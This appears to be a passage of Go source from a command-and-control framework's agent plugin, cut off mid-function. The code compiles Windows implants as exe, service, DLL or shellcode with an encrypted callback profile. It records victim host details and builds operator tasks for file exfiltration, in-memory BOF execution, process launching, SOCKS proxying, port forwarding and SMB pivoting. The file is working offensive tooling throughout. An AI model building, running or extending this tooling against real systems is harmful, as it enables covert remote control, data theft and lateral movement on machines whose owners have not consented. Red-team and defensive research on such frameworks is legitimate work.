package main

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"hash/crc32"
	"math/rand"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

var SetListeners = []string{"BeaconHTTP", "BeaconSMB"}

const (
	SetName            = "beacon"
	SetUiPath          = "_ui_agent.json"
	SetCmdPath         = "_cmd_agent.json"
	SetMaxTaskDataSize = 0x1900000 // 25 Mb
)

type GenerateConfig struct {
	Os      string `json:"os"`
	Arch    string `json:"arch"`
	Format  string `json:"format"`
	Sleep   string `json:"sleep"`
	Jitter  int    `json:"jitter"`
	SvcName string `json:"svcname"`
}

var (
	ObjectDir_http = "objects_http"
	ObjectDir_smb  = "objects_smb"
	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "Boffer", "Commander", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
	CFlag          = "-c -fno-builtin -fno-unwind-tables -fno-strict-aliasing -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpermissive -w -masm=intel -fPIC"
	LFlags         = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
)

func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map[string]any) ([]byte, error) {
	var (
		generateConfig GenerateConfig
		err            error
		params         []interface{}
	)

	err = json.Unmarshal([]byte(agentConfig), &generateConfig)
	if err != nil {
		return nil, err
	}

	table := crc32.MakeTable(crc32.IEEE)
	agentCrc := int(crc32.Checksum([]byte(SetName), table))

	encrypt_key, _ := listenerMap["encrypt_key"].(string)
	encryptKey, err := base64.StdEncoding.DecodeString(encrypt_key)
	if err != nil {
		return nil, err
	}

	seconds, err := parseDurationToSeconds(generateConfig.Sleep)
	if err != nil {
		return nil, err
	}

	protocol, _ := listenerMap["protocol"].(string)
	switch protocol {

	case "http":

		portAgentStr, _ := listenerMap["callback_port"].(string)
		PortAgent, _ := strconv.Atoi(portAgentStr)

		var HostsAgent []string
		hosts_agent, _ := listenerMap["hosts_agent"].([]any)
		for _, value := range hosts_agent {
			HostsAgent = append(HostsAgent, value.(string))
		}
		c2Count := len(HostsAgent)

		HttpMethod, _ := listenerMap["http_method"].(string)
		Ssl, _ := listenerMap["ssl"].(bool)
		Uri, _ := listenerMap["urn"].(string)
		ParameterName, _ := listenerMap["hb_header"].(string)
		UserAgent, _ := listenerMap["user_agent"].(string)
		RequestHeaders, _ := listenerMap["request_headers"].(string)

		WebPageOutput, _ := listenerMap["page-payload"].(string)
		ansOffset1 := strings.Index(WebPageOutput, "<<<PAYLOAD_DATA>>>")
		ansOffset2 := len(WebPageOutput[ansOffset1+len("<<<PAYLOAD_DATA>>>"):])

		seconds, err := parseDurationToSeconds(generateConfig.Sleep)
		if err != nil {
			return nil, err
		}

		params = append(params, agentCrc)
		params = append(params, Ssl)
		params = append(params, PortAgent)
		params = append(params, c2Count)
		for i := 0; i < c2Count; i++ {
			params = append(params, HostsAgent[i])
		}
		params = append(params, HttpMethod)
		params = append(params, Uri)
		params = append(params, ParameterName)
		params = append(params, UserAgent)
		params = append(params, RequestHeaders)
		params = append(params, ansOffset1)
		params = append(params, ansOffset2)
		params = append(params, seconds)
		params = append(params, generateConfig.Jitter)

	case "smb":

		pipename, _ := listenerMap["pipename"].(string)
		pipename = "\\\\.\\pipe\\" + pipename

		lWatermark, _ := strconv.ParseInt(listenerWM, 16, 64)

		params = append(params, agentCrc)
		params = append(params, pipename)
		params = append(params, int(lWatermark))
		params = append(params, seconds)
		params = append(params, generateConfig.Jitter)

	default:
		return nil, errors.New("protocol unknown")
	}

	packedParams, err := PackArray(params)
	if err != nil {
		return nil, err
	}

	cryptParams, err := RC4Crypt(packedParams, encryptKey)
	if err != nil {
		return nil, err
	}

	profileArray := []interface{}{len(cryptParams), cryptParams, encryptKey}
	packedProfile, err := PackArray(profileArray)
	if err != nil {
		return nil, err
	}

	profileString := ""
	for _, b := range packedProfile {
		profileString += fmt.Sprintf("\\x%02x", b)
	}

	return []byte(profileString), nil
}

func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map[string]any) ([]byte, string, error) {
	var (
		generateConfig GenerateConfig
		ConnectorFile  string
		ObjectDir      string
		Compiler       string
		Ext            string
		stubPath       string
		Filename       string
		buildPath      string
		cmdConfig      string
		stdout         bytes.Buffer
		stderr         bytes.Buffer
	)

	err := json.Unmarshal([]byte(agentConfig), &generateConfig)
	if err != nil {
		return nil, "", err
	}

	currentDir := PluginPath
	tempDir, err := os.MkdirTemp("", "ax-*")
	if err != nil {
		return nil, "", err
	}

	protocol, _ := listenerMap["protocol"].(string)
	if protocol == "http" {
		ObjectDir = ObjectDir_http
		ConnectorFile = "ConnectorHTTP"
	} else if protocol == "smb" {
		ObjectDir = ObjectDir_smb
		ConnectorFile = "ConnectorSMB"
	} else {
		return nil, "", errors.New("protocol unknown")
	}

	if generateConfig.Arch == "x86" {
		Compiler = "i686-w64-mingw32-g++"
		Ext = ".x86.o"
		stubPath = currentDir + "/" + ObjectDir + "/stub.x86.bin"
		Filename = "agent.x86"
	} else {
		Compiler = "x86_64-w64-mingw32-g++"
		Ext = ".x64.o"
		stubPath = currentDir + "/" + ObjectDir + "/stub.x64.bin"
		Filename = "agent.x64"
	}

	svcName := ""
	for _, char := range generateConfig.SvcName {
		svcName += fmt.Sprintf("\\x%02x", char)
	}

	agentProfileSize := len(agentProfile) / 4
	if generateConfig.Format == "Service Exe" {
		cmdConfig = fmt.Sprintf("%s %s %s/config.cpp -DBUILD_SVC -DSERVICE_NAME='\"%s\"' -DPROFILE='\"%s\"' -DPROFILE_SIZE=%d -o %s/config.o", Compiler, CFlag, ObjectDir, svcName, string(agentProfile), agentProfileSize, tempDir)
	} else {
		cmdConfig = fmt.Sprintf("%s %s %s/config.cpp -DPROFILE='\"%s\"' -DPROFILE_SIZE=%d -o %s/config.o", Compiler, CFlag, ObjectDir, string(agentProfile), agentProfileSize, tempDir)
	}
	runnerCmdConfig := exec.Command("sh", "-c", cmdConfig)
	runnerCmdConfig.Dir = currentDir
	runnerCmdConfig.Stdout = &stdout
	runnerCmdConfig.Stderr = &stderr
	err = runnerCmdConfig.Run()
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", errors.New(string(stderr.Bytes()))
	}

	Files := tempDir + "/config.o "
	Files += ObjectDir + "/" + ConnectorFile + Ext + " "
	for _, ofile := range ObjectFiles {
		Files += ObjectDir + "/" + ofile + Ext + " "
	}

	if generateConfig.Format == "Exe" {
		Files += ObjectDir + "/main" + Ext
		buildPath = tempDir + "/file.exe"
		Filename += ".exe"
	} else if generateConfig.Format == "Service Exe" {
		Files += ObjectDir + "/main_service" + Ext
		buildPath = tempDir + "/svc.exe"
		Filename = "svc_" + Filename + ".exe"
	} else if generateConfig.Format == "DLL" {
		Files += ObjectDir + "/main_dll" + Ext
		LFlags += " -shared"
		buildPath = tempDir + "/file.dll"
		Filename += ".dll"
	} else if generateConfig.Format == "Shellcode" {
		Files += ObjectDir + "/main_shellcode" + Ext
		LFlags += " -shared"
		buildPath = tempDir + "/file.dll"
		Filename += ".bin"
	} else {
		_ = os.RemoveAll(tempDir)
		return nil, "", errors.New("unknown file format")
	}

	cmdBuild := fmt.Sprintf("%s %s %s -o %s", Compiler, LFlags, Files, buildPath)
	runnerCmdBuild := exec.Command("sh", "-c", cmdBuild)
	runnerCmdBuild.Dir = currentDir
	runnerCmdBuild.Stdout = &stdout
	runnerCmdBuild.Stderr = &stderr
	err = runnerCmdBuild.Run()
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}

	buildContent, err := os.ReadFile(buildPath)
	if err != nil {
		return nil, "", err
	}
	_ = os.RemoveAll(tempDir)

	if generateConfig.Format == "Shellcode" {
		stubContent, err := os.ReadFile(stubPath)
		if err != nil {
			return nil, "", err
		}

		return append(stubContent, buildContent...), Filename, nil

	} else {
		return buildContent, Filename, nil
	}
}

func CreateAgent(initialData []byte) (AgentData, error) {
	var agent AgentData

	/// START CODE HERE

	packer := CreatePacker(initialData)

	if false == packer.CheckPacker([]string{"int", "int", "word", "word", "byte", "word", "word", "int", "byte", "byte", "int", "byte", "array", "array", "array", "array", "array"}) {
		return agent, errors.New("error agent data")
	}

	agent.Sleep = packer.ParseInt32()
	agent.Jitter = packer.ParseInt32()
	agent.ACP = int(packer.ParseInt16())
	agent.OemCP = int(packer.ParseInt16())
	agent.GmtOffset = int(packer.ParseInt8())
	agent.Pid = fmt.Sprintf("%v", packer.ParseInt16())
	agent.Tid = fmt.Sprintf("%v", packer.ParseInt16())

	buildNumber := packer.ParseInt32()
	majorVersion := packer.ParseInt8()
	minorVersion := packer.ParseInt8()
	internalIp := packer.ParseInt32()
	flag := packer.ParseInt8()

	agent.Arch = "x32"
	if (flag & 0b00000001) > 0 {
		agent.Arch = "x64"
	}

	systemArch := "x32"
	if (flag & 0b00000010) > 0 {
		systemArch = "x64"
	}

	agent.Elevated = false
	if (flag & 0b00000100) > 0 {
		agent.Elevated = true
	}

	IsServer := false
	if (flag & 0b00001000) > 0 {
		IsServer = true
	}

	agent.InternalIP = int32ToIPv4(internalIp)
	agent.Os, agent.OsDesc = GetOsVersion(majorVersion, minorVersion, buildNumber, IsServer, systemArch)

	agent.SessionKey = packer.ParseBytes()
	agent.Domain = string(packer.ParseBytes())
	agent.Computer = string(packer.ParseBytes())
	agent.Username = ConvertCpToUTF8(string(packer.ParseBytes()), agent.ACP)
	agent.Process = ConvertCpToUTF8(string(packer.ParseBytes()), agent.ACP)

	/// END CODE

	return agent, nil
}

/// TASKS

func PackTasks(agentData AgentData, tasksArray []TaskData) ([]byte, error) {
	var packData []byte

	/// START CODE HERE

	var (
		array []interface{}
		err   error
	)

	for _, taskData := range tasksArray {
		taskId, err := strconv.ParseInt(taskData.TaskId, 16, 64)
		if err != nil {
			return nil, err
		}
		array = append(array, taskData.Data)
		array = append(array, int(taskId))
	}

	packData, err = PackArray(array)
	if err != nil {
		return nil, err
	}

	size := make([]byte, 4)
	binary.LittleEndian.PutUint32(size, uint32(len(packData)))
	packData = append(size, packData...)

	/// END CODE

	return packData, nil
}

func PackPivotTasks(pivotId string, data []byte) ([]byte, error) {
	id, _ := strconv.ParseInt(pivotId, 16, 64)
	array := []interface{}{COMMAND_PIVOT_EXEC, int(id), len(data), data}
	return PackArray(array)
}

func CreateTaskCommandSaveMemory(ts Teamserver, agentId string, buffer []byte) int {
	chunkSize := 0x100000 // 1Mb
	memoryId := int(rand.Uint32())

	bufferSize := len(buffer)

	taskData := TaskData{
		Type:    TYPE_TASK,
		AgentId: agentId,
		Sync:    false,
	}

	for start := 0; start < bufferSize; start += chunkSize {
		fin := start + chunkSize
		if fin > bufferSize {
			fin = bufferSize
		}

		array := []interface{}{COMMAND_SAVEMEMORY, memoryId, bufferSize, fin - start, buffer[start:fin]}

		taskData.TaskId = fmt.Sprintf("%08x", rand.Uint32())
		taskData.Data, _ = PackArray(array)

		var taskBuffer bytes.Buffer
		_ = json.NewEncoder(&taskBuffer).Encode(taskData)

		ts.TsTaskCreate(agentId, "", "", taskBuffer.Bytes())
	}
	return memoryId
}

func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]any) (TaskData, ConsoleMessageData, error) {
	var (
		taskData    TaskData
		messageData ConsoleMessageData
		err         error
	)

	taskData = TaskData{
		Type: TYPE_TASK,
		Sync: true,
	}

	messageData = ConsoleMessageData{
		Status: MESSAGE_INFO,
		Text:   "",
	}
	messageData.Message, _ = args["message"].(string)

	subcommand, _ := args["subcommand"].(string)

	/// START CODE HERE

	var array []interface{}

	switch command {

	case "cat":
		path, ok := args["path"].(string)
		if !ok {
			err = errors.New("parameter 'path' must be set")
			goto RET
		}
		array = []interface{}{COMMAND_CAT, ConvertUTF8toCp(path, agent.ACP)}

	case "cd":
		path, ok := args["path"].(string)
		if !ok {
			err = errors.New("parameter 'path' must be set")
			goto RET
		}
		array = []interface{}{COMMAND_CD, ConvertUTF8toCp(path, agent.ACP)}

	case "cp":
		src, ok := args["src"].(string)
		if !ok {
			err = errors.New("parameter 'src' must be set")
			goto RET
		}
		dst, ok := args["dst"].(string)
		if !ok {
			err = errors.New("parameter 'dst' must be set")
			goto RET
		}
		array = []interface{}{COMMAND_COPY, ConvertUTF8toCp(src, agent.ACP), ConvertUTF8toCp(dst, agent.ACP)}

	case "disks":
		array = []interface{}{COMMAND_DISKS}

	case "download":
		path, ok := args["file"].(string)
		if !ok {
			err = errors.New("parameter 'file' must be set")
			goto RET
		}
		array = []interface{}{COMMAND_DOWNLOAD, ConvertUTF8toCp(path, agent.ACP)}

	case "execute":
		if subcommand == "bof" {
			taskData.Type = TYPE_JOB

			bofFile, ok := args["bof"].(string)
			if !ok {
				err = errors.New("parameter 'bof' must be set")
				goto RET
			}
			bofContent, err := base64.StdEncoding.DecodeString(bofFile)
			if err != nil {
				goto RET
			}

			var params []byte
			paramData, ok := args["param_data"].(string)
			if ok {
				params, err = base64.StdEncoding.DecodeString(paramData)
				if err != nil {
					params = []byte(paramData)
				}
			}

			array = []interface{}{COMMAND_EXEC_BOF, "go", len(bofContent), bofContent, len(params), params}
		} else {
			err = errors.New("subcommand must be 'bof'")
			goto RET
		}

	case "exfil":
		fid, ok := args["file_id"].(string)
		if !ok {
			err = errors.New("parameter 'file_id' must be set")
			goto RET
		}

		fileId, err := strconv.ParseInt(fid, 16, 64)
		if err != nil {
			goto RET
		}

		if subcommand == "cancel" {
			array = []interface{}{COMMAND_EXFIL, DOWNLOAD_STATE_CANCELED, int(fileId)}
		} else if subcommand == "stop" {
			array = []interface{}{COMMAND_EXFIL, DOWNLOAD_STATE_STOPPED, int(fileId)}
		} else if subcommand == "start" {
			array = []interface{}{COMMAND_EXFIL, DOWNLOAD_STATE_RUNNING, int(fileId)}
		} else {
			err = errors.New("subcommand must be 'cancel', 'start' or 'stop'")
			goto RET
		}

	case "getuid":
		array = []interface{}{COMMAND_GETUID}

	case "jobs":
		if subcommand == "list" {
			array = []interface{}{COMMAND_JOB_LIST}

		} else if subcommand == "kill" {
			job, ok := args["task_id"].(string)
			if !ok {
				err = errors.New("parameter 'task_id' must be set")
				goto RET
			}

			jobId, err := strconv.ParseInt(job, 16, 64)
			if err != nil {
				goto RET
			}

			array = []interface{}{COMMAND_JOBS_KILL, int(jobId)}
		} else {
			err = errors.New("subcommand must be 'list' or 'kill'")
			goto RET
		}

	case "link":
		if subcommand == "list" {
			//array = []interface{}{COMMAND_PS_LIST}

		} else if subcommand == "smb" {
			target, ok := args["target"].(string)
			if !ok {
				err = errors.New("parameter 'target' must be set")
				goto RET
			}
			pipename, ok := args["pipename"].(string)
			if !ok {
				err = errors.New("parameter 'pipename' must be set")
				goto RET
			}
			pipe := fmt.Sprintf("\\\\%s\\pipe\\%s", target, pipename)

			array = []interface{}{COMMAND_LINK, 1, pipe}

		} else {
			err = errors.New("subcommand must be 'list' or 'smb'")
			goto RET
		}

	case "ls":
		dir, ok := args["directory"].(string)
		if !ok {
			err = errors.New("parameter 'directory' must be set")
			goto RET
		}
		dir = ConvertUTF8toCp(dir, agent.ACP)

		array = []interface{}{COMMAND_LS, dir}

	case "lportfwd":
		taskData.Type = TYPE_TUNNEL

		lportNumber, ok := args["lport"].(float64)
		lport := int(lportNumber)
		if ok {
			if lport < 1 || lport > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}
		}

		if subcommand == "start" {
			lhost, ok := args["lhost"].(string)
			if !ok {
				err = errors.New("parameter 'lhost' must be set")
				goto RET
			}
			fhost, ok := args["fwdhost"].(string)
			if !ok {
				err = errors.New("parameter 'fwdhost' must be set")
				goto RET
			}
			fportNumber, ok := args["fwdport"].(float64)
			fport := int(fportNumber)
			if ok {
				if fport < 1 || fport > 65535 {
					err = errors.New("port must be from 1 to 65535")
					goto RET
				}
			}
			taskData.TaskId, err = ts.TsTunnelCreateLocalPortFwd(agent.Id, lhost, lport, fhost, fport, TunnelMessageConnectTCP, TunnelMessageWriteTCP, TunnelMessageClose)
			if err != nil {
				goto RET
			}
			taskData.Message = fmt.Sprintf("Started local port forwarding on %s:%d to %s:%d", lhost, lport, fhost, fport)
			taskData.MessageType = MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "stop" {
			taskData.Completed = true

			ts.TsTunnelStopLocalPortFwd(agent.Id, lport)

			taskData.Message = fmt.Sprintf("Local port forwarding on %d stopped", lport)
			taskData.MessageType = MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "mv":
		src, ok := args["src"].(string)
		if !ok {
			err = errors.New("parameter 'src' must be set")
			goto RET
		}
		dst, ok := args["dst"].(string)
		if !ok {
			err = errors.New("parameter 'dst' must be set")
			goto RET
		}
		array = []interface{}{COMMAND_MV, ConvertUTF8toCp(src, agent.ACP), ConvertUTF8toCp(dst, agent.ACP)}

	case "mkdir":
		path, ok := args["path"].(string)
		if !ok {
			err = errors.New("parameter 'path' must be set")
			goto RET
		}
		array = []interface{}{COMMAND_MKDIR, ConvertUTF8toCp(path, agent.ACP)}

	case "profile":
		if subcommand == "download.chunksize" {

			size, ok := args["size"].(float64)
			if !ok {
				err = errors.New("parameter 'size' must be set")
				goto RET
			}
			array = []interface{}{COMMAND_PROFILE, 2, int(size)}

		} else {
			err = errors.New("subcommand for 'profile' not found")
			goto RET
		}

	case "ps":
		if subcommand == "list" {
			array = []interface{}{COMMAND_PS_LIST}

		} else if subcommand == "kill" {
			pid, ok := args["pid"].(float64)
			if !ok {
				err = errors.New("parameter 'pid' must be set")
				goto RET
			}
			array = []interface{}{COMMAND_PS_KILL, int(pid)}

		} else if subcommand == "run" {
			taskData.Type = TYPE_JOB

			output, _ := args["-o"].(bool)
			suspend, _ := args["-s"].(bool)
			programState := 0
			if suspend {
				programState = 4
			}
			programArgs, ok := args["args"].(string)
			if ok {
				programArgs = ConvertUTF8toCp(programArgs, agent.ACP)
			}

			program, ok := args["program"].(string)
			if !ok {
				err = errors.New("parameter 'program' must be set")
				goto RET
			}
			program = ConvertUTF8toCp(program, agent.ACP)

			array = []interface{}{COMMAND_PS_RUN, output, programState, program, programArgs}

		} else {
			err = errors.New("subcommand must be 'list', 'kill' or 'run'")
			goto RET
		}

	case "pwd":
		array = []interface{}{COMMAND_PWD}

	case "rev2self":
		array = []interface{}{COMMAND_REV2SELF}

	case "rm":
		path, ok := args["path"].(string)
		if !ok {
			err = errors.New("parameter 'path' must be set")
			goto RET
		}
		array = []interface{}{COMMAND_RM, ConvertUTF8toCp(path, agent.ACP)}

	case "rportfwd":
		taskData.Type = TYPE_TUNNEL

		lportNumber, ok := args["lport"].(float64)
		lport := int(lportNumber)
		if ok {
			if lport < 1 || lport > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}
		}

		if subcommand == "start" {
			fhost, ok := args["fwdhost"].(string)
			if !ok {
				err = errors.New("parameter 'fwdhost' must be set")
				goto RET
			}
			fportNumber, ok := args["fwdport"].(float64)
			fport := int(fportNumber)
			if ok {
				if fport < 1 || fport > 65535 {
					err = errors.New("port must be from 1 to 65535")
					goto RET
				}
			}

			taskData.TaskId, err = ts.TsTunnelCreateRemotePortFwd(agent.Id, lport, fhost, fport, TunnelMessageReverse, TunnelMessageWriteTCP, TunnelMessageClose)
			if err != nil {
				goto RET
			}
			messageData.Message = fmt.Sprintf("Starting reverse port forwarding %d to %s:%d", lport, fhost, fport)
			messageData.Status = MESSAGE_INFO
			messageData.Text = "\n"

		} else if subcommand == "stop" {
			taskData.Completed = true

			ts.TsTunnelStopRemotePortFwd(agent.Id, lport)

			taskData.MessageType = MESSAGE_SUCCESS
			taskData.Message = "Reverse port forwarding has been stopped"
			taskData.ClearText = "\n"

		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "sleep":
		var (
			sleepTime  int
			jitter     float64
			jitterTime int
			jitterOk   bool
		)
		sleep, sleepOk := args["sleep"].(string)
		if !sleepOk {
			err = errors.New("parameter 'sleep' must be set")
			goto RET
		}
		jitter, jitterOk = args["jitter"].(float64)
		jitterTime = int(jitter)

		sleepInt, err := strconv.Atoi(sleep)
		if err == nil {
			sleepTime = sleepInt
		} else {
			t, err := time.ParseDuration(sleep)
			if err == nil {
				sleepTime = int(t.Seconds())
			} else {
				err = errors.New("sleep must be in '%h%m%s' format or number of seconds")
				goto RET
			}
		}
		messageData.Message = fmt.Sprintf("Task: sleep to %v", sleep)

		if jitterOk {
			if jitterTime < 0 || jitterTime > 100 {
				err = errors.New("jitterTime must be from 0 to 100")
				goto RET
			}
			messageData.Message = fmt.Sprintf("Task: sleep to %v with %v%% jitter", sleep, jitterTime)
		}

		array = []interface{}{COMMAND_PROFILE, 1, sleepTime, jitterTime}

	case "socks":
		taskData.Type = TYPE_TUNNEL

		portNumber, ok := args["port"].(float64)
		port := int(portNumber)
		if ok {
			if port < 1 || port > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}
		}
		if subcommand == "start" {
			address, ok := args["address"].(string)
			if !ok {
				err = errors.New("parameter 'address' must be set")
				goto RET
			}

			version4, _ := args["-socks4"].(bool)
			if version4 {
				taskData.TaskId, err = ts.TsTunnelCreateSocks4(agent.Id, address, port, TunnelMessageConnectTCP, TunnelMessageWriteTCP, TunnelMessageClose)
				if err != nil {
					goto RET
				}
				taskData.Message = fmt.Sprintf("Socks4 server running on port %d", port)

			} else {
				auth, _ := args["-auth"].(bool)
				if auth {
					username, ok := args["username"].(string)
					if !ok {
						err = errors.New("parameter 'username' must be set")
						goto RET
					}
					password, ok := args["password"].(string)
					if !ok {
						err = errors.New("parameter 'password' must be set")
						goto RET
					}
					taskData.TaskId, err = ts.TsTunnelCreateSocks5Auth(agent.Id, address, port, username, password, TunnelMessageConnectTCP, TunnelMessageConnectUDP, TunnelMessageWriteTCP, TunnelMessageWriteUDP, TunnelMessageClose)
					if err != nil {
						goto RET
					}
					taskData.Message = fmt.Sprintf("Socks5 (with Auth) server running on port %d", port)

				} else {
					taskData.TaskId, err = ts.TsTunnelCreateSocks5(agent.Id, address, port, TunnelMessageConnectTCP, TunnelMessageConnectUDP, TunnelMessageWriteTCP, TunnelMessageWriteUDP, TunnelMessageClose)
					if err != nil {
						goto RET
					}
					taskData.Message = fmt.Sprintf("Socks5 server running on port %d", port)
				}
			}
			taskData.MessageType = MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "stop" {
			taskData.Completed = true

			ts.TsTunnelStopSocks(agent.Id, port)

			taskData.MessageType = MESSAGE_SUCCESS
			taskData.Message = "Socks5 server has been stopped"
			taskData.ClearText = "\n"

		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "terminate":
		if subcommand == "thread" {
			array = []interface{}{COMMAND_TERMINATE, 1}
		} else if subcommand == "process" {
			array = []interface{}{COMMAND_TERMINATE, 2}
		} else {
			err = errors.New("subcommand must be 'thread' or 'process'")
			goto RET
		}

	case "unlink":
		pivotName, ok := args["id"].(string)
		if !ok {
			err = errors.New("parameter 'id' must be set")
			goto RET
		}

		pivotId, _, _ := ts.TsGetPivotInfoByName(pivotName)
		if pivotId == "" {
			err = fmt.Errorf("pivot %s does not exist", pivotName)
			goto RET
		}
		id, _ := strconv.ParseInt(pivotId, 16, 64)

		array = []interface{}{COMMAND_UNLINK, int(id)}

	case "upload":
		fileName, ok := args["remote_path"].(string)
		if !ok {
			err = errors.New("parameter 'remote_path' must be set")
			goto RET
		}
		localFile, ok := args["local_file"].(string)
		if !ok {
			err = errors.New("parameter 'local_file' must be set")
			goto RET
		}

		fileContent, err := base64.StdEncoding.DecodeString(localFile)
		if err != nil {
			goto RET
		}

		memoryId := CreateTaskCommandSaveMemory(ts, agent.Id, fileContent)

		array = []interface{}{COMMAND_UPLOAD, memoryId, ConvertUTF8toCp(fileName, agent.ACP)}

	default:
		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
		goto RET
	}

	taskData.Data, err = PackArray(array)
	if err != nil {
		goto RET
	}

	/// END CODE

RET:
	return taskData, messageData, err
}

func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, packedData []byte) []TaskData {
	var outTasks []TaskData

	/// START CODE

	packer := CreatePacker(packedData)

	if false == packer.CheckPacker([]string{"int"}) {
		return outTasks
	}

	size := packer.ParseInt32()
	if size-4 != packer.Size() {
		fmt.Println("Invalid tasks data")
		return outTasks
	}

	for packer.Size() >= 8 {

		if false == packer.CheckPacker([]string{"int", "int"}) {
			return outTasks
		}

		TaskId := packer.ParseInt32()
		commandId := packer.ParseInt32()
		task := taskData
		task.TaskId = fmt.Sprintf("%08x", TaskId)

		switch commandId {

		case COMMAND_CAT:
			if false == packer.CheckPacker([]string{"array", "array"}) {
				return outTasks
			}
			path := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			fileContent := packer.ParseBytes()
			task.Message = fmt.Sprintf("'%v' file content:", path)
			task.ClearText = string(fileContent)

		case COMMAND_CD:
			if false == packer.CheckPacker([]string{"array"}) {
				return outTasks
			}
			path := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			task.Message = "Current working directory:"
			task.ClearText = path

		case COMMAND_COPY:
			task.Message = "File copied successfully"

		case COMMAND_DISKS:
			if false == packer.CheckPacker([]string{"byte", "int"}) {
				return outTasks
			}
			result := packer.ParseInt8()
			var drives []ListingDrivesData

			if result == 0 {
				errorCode := packer.ParseInt32()
				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, win32ErrorCodes[errorCode])
				task.MessageType = MESSAGE_ERROR

			} else {
				drivesCount := int(packer.ParseInt32())

				for i := 0; i < drivesCount; i++ {
					if false == packer.CheckPacker([]string{"byte", "int"}) {
						return outTasks
					}
					var driveData ListingDrivesData
					driveCode := packer.ParseInt8()
					driveType := packer.ParseInt32()

					driveData.Name = fmt.Sprintf("%c:", driveCode)
					if driveType == 2 {
						driveData.Type = "USB"
					} else if driveType == 3 {
						driveData.Type = "Hard Drive"
					} else if driveType == 4 {
						driveData.Type = "Network Drive"
					} else if driveType == 5 {
						driveData.Type = "CD-ROM"
					} else {
						driveData.Type = "Unknown"
					}

					drives = append(drives, driveData)
				}

				OutputText := fmt.Sprintf(" %-5s  %s\n", "Drive", "Type")
				OutputText += fmt.Sprintf(" %-5s  %s", "-----", "-----")
				for _, item := range drives {
					OutputText += fmt.Sprintf("\n %-5s  %s", item.Name, item.Type)
				}
				task.Message = "List of mounted drives:"
				task.ClearText = OutputText
			}

			SyncBrowserDisks(ts, task, drives)

		case COMMAND_DOWNLOAD:
			if false == packer.CheckPacker([]string{"int", "byte"}) {
				return outTasks
			}
			fileId := fmt.Sprintf("%08x", packer.ParseInt32())
			downloadCommand := packer.ParseInt8()
			if downloadCommand == DOWNLOAD_START {
				if false == packer.CheckPacker([]string{"int", "array"}) {
					return outTasks
				}
				fileSize := packer.ParseInt32()
				fileName := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
				task.Message = fmt.Sprintf("The download of the '%s' file (%v bytes) has started: [fid %v]", fileName, fileSize, fileId)
				task.Completed = false
				_ = ts.TsDownloadAdd(agentData.Id, fileId, fileName, int(fileSize))

			} else if downloadCommand == DOWNLOAD_CONTINUE {
				if false == packer.CheckPacker([]string{"array"}) {
					return outTasks
				}
				fileContent := packer.ParseBytes()
				task.Completed = false
				_ = ts.TsDownloadUpdate(fileId, DOWNLOAD_STATE_RUNNING, fileContent)
				continue

			} else if downloadCommand == DOWNLOAD_FINISH {
				task.Message = fmt.Sprintf("File download complete: [fid %v]", fileId)
				_ = ts.TsDownloadClose(fileId, DOWNLOAD_STATE_FINISHED)
			}

		case COMMAND_EXFIL:
			if false == packer.CheckPacker([]string{"int", "byte"}) {
				return outTasks
			}
			fileId := fmt.Sprintf("%08x", packer.ParseInt32())
			downloadState := packer.ParseInt8()

			if downloadState == DOWNLOAD_STATE_STOPPED {
				task.Message = fmt.Sprintf("Download '%v' successful stopped", fileId)
				_ = ts.TsDownloadUpdate(fileId, DOWNLOAD_STATE_STOPPED, []byte(""))

			} else if downloadState == DOWNLOAD_STATE_RUNNING {
				task.Message = fmt.Sprintf("Download '%v' successful resumed", fileId)
				_ = ts.TsDownloadUpdate(fileId, DOWNLOAD_STATE_RUNNING, []byte(""))

			} else if downloadState == DOWNLOAD_STATE_CANCELED {
				task.Message = fmt.Sprintf("Download '%v' successful canceled", fileId)
				_ = ts.TsDownloadClose(fileId, DOWNLOAD_STATE_CANCELED)
			}

		case COMMAND_EXEC_BOF:
			task.Message = "BOF finished"
			task.Completed = true

		case COMMAND_EXEC_BOF_OUT:
			if false == packer.CheckPacker([]string{"int", "array"}) {
				return outTasks
			}

			outputType := packer.ParseInt32()
			output := packer.ParseString()

			if outputType == BOF_ERROR_PARSE {
				task.MessageType = MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Parse BOF error"
			} else if outputType == BOF_ERROR_MAX_FUNCS {
				task.MessageType = MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "The number of functions in the BOF file exceeds 512"
			} else if outputType == BOF_ERROR_ENTRY {
				task.MessageType = MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Entry function not found"

			} else if outputType == BOF_ERROR_ALLOC {
				task.MessageType = MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Error allocation of BOF memory"

			} else if outputType == BOF_ERROR_SYMBOL {
				task.MessageType = MESSAGE_ERROR
				task.Message = "BOF error"
